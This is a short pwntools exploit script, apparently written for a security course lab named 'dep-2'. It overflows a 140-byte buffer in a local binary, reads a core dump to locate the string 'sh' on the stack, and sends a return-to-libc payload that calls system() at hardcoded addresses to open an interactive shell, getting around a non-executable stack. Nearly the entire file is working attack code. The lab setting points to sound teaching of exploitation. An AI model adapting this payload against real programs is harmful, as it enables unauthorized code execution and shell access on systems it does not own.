#!/usr/bin/env python
from pwn import *

size = 140
sys_addr = p32(0xf7e26200)
exit_addr = p32(0xf7e193d0)

p = process('/home/student/lab5/dep-2/dep-2')

p.send('A' * size + 'BBBB')
p.wait()

c = Core('core')
sh_addr = c.stack.find('sh\0')

print 'sh is at %s' % hex(sh_addr)

sh_addr = p32(sh_addr)

buf = 'A' * size + sys_addr * 2 + sh_addr * 2

print 'Payload: %s' % buf

p = process('/home/student/lab5/dep-2/dep-2')

p.send(buf)
p.interactive()
